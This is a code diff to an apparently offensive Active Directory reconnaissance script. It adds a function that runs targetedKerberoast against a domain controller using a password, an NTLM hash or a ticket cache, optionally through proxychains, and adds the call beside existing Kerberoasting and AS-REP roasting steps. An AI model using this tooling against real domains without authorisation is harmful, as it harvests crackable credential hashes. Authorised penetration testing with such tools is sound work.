@@ -191,6 +191,59 @@ def gather_kerberoasting_data(args, domain, dc, output_dir):
         print(f"Error running Kerberoasting data gathering: {e}")
         sys.exit(1)
 
+def gather_targeted_kerberoast_data(args, domain, dc, output_dir):
+    import os
+    import shutil
+    import subprocess
+    import sys
+
+    GRAY = "\033[90m"
+    RESET = "\033[0m"
+
+    try:
+        # Build the command with optional proxychains
+        proxychains_command = ['proxychains', '-q'] if args.proxychains else []
+        script_path = os.path.expanduser('~/.local/bin/targetedKerberoast/targetedKerberoast.py')
+
+        if args.password:
+            cmd = proxychains_command + [
+                'python3', script_path,
+                '-u', args.username,
+                '-p', args.password,
+                '-d', domain,
+                '--dc-ip', dc
+            ]
+        elif args.hash:
+            cmd = proxychains_command + [
+                'python3', script_path,
+                '-u', args.username,
+                '-H', args.hash,
+                '-d', domain,
+                '--dc-ip', dc
+            ]
+        elif args.ticket:
+            cmd = proxychains_command + [
+                'python3', script_path,
+                '--use-kcache',
+                '-d', domain,
+                '--dc-ip', dc
+            ]
+
+        # Print and run the command
+        print(f"{GRAY}Running command:{RESET} {' '.join(cmd)}")
+        subprocess.check_call(cmd)
+
+        # Move the output file to the specified output directory
+        src = 'targetedKerberoast-output.txt'
+        dst = os.path.join(output_dir, src)
+        if os.path.exists(src):
+            shutil.move(src, dst)
+
+    except subprocess.CalledProcessError as e:
+        print(f"Error running targetedKerberoast: {e}")
+        sys.exit(1)
+
+
 
 def gather_ldap_signing_data(args, domain, dc, output_dir):
     GRAY = "\033[90m"
@@ -682,6 +735,7 @@ def execute_commands(args, domain, dc, hostname):
     gather_ldapdomaindump_data(args, domain, output_dir)
     gather_bloodhound_data(args, domain, dc, output_dir)
     gather_kerberoasting_data(args, domain, dc, output_dir)
+    gather_targeted_kerberoast_data(args, domain, dc, output_dir)
     gather_asreproasting_data(args, domain, dc, output_dir)
     gather_delegation_data(args, domain, dc, output_dir)
     gather_gmsa_data(args, domain, dc, output_dir)
